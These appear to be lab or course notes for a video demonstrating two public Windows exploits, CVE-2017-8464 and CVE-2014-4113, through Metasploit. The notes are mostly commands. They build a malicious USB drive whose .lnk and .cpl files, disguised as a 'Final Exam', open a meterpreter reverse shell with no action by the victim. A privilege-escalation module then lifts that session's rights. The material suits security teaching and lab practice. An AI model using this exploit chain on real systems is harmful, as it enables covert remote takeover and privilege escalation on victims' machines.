
CVE-2017-8464 & CVE-2014-4113  |  LNK Code Execution Vulnerability & Windows TrackPopupMenu

https://www.youtube.com/watch?v=72aRGg7G798

--------------

LNK Code Execution Vulnerability

https://www.cvedetails.com/cve/cve-2017-8464

https://www.rapid7.com/db/modules/exploit/windows/fileformat/cve_2017_8464_lnk_rce

Windows TrackPopupMenu Win32k NULL Pointer Dereference

https://www.cvedetails.com/cve/cve-2014-4113

https://www.rapid7.com/db/modules/exploit/windows/local/ms14_058_track_popup_menu

--------------

1. Preparing your malicious USB flash drive

> use exploit/windows/fileformat/cve_2017_8464_lnk_rce

> set DLLNAME 7_411_Final_Exam.cpl
> set FILENAME 7_411_Final Exam.lnk

- Setup payload (x64) for Server 2008 R2
> set payload windows/x64/meterpreter/reverse_tcp
```
[*] /root/.msf4/local/7_411_Final_Exam.cpl created, copy it to the "root" folder of the target USB drive
[*] /root/.msf4/local/7_411_FinalExam_D.lnk created, copy to the target USB drive
```
2. Setting up handler

> use multi/handler

- Setup payload (x64) for Server 2008 R2
> set payload windows/x64/meterpreter/reverse_tcp

> run

3. Attach & Copy & Eject USB drive -> unmount your USB safely

4. Creating a low privileged user account on victim machine => login using newly created user account

5. Attach USB to victim machine => victim does not need to do anything...

6. Get your session 

> getuid => still running as a low privileged user => need to find a way to escalate our privilege

--------------

7. Windows privilege escalation

> use exploit/windows/local/ms14_058_track_popup_menu

- Choose the right session + right payload info
- Set target 1 (x64) => for this particular case only (Server 2008 R2 x64)

> exploit

- Shutdown & reboot victim machine
> shutdown /r /t 0

--------------
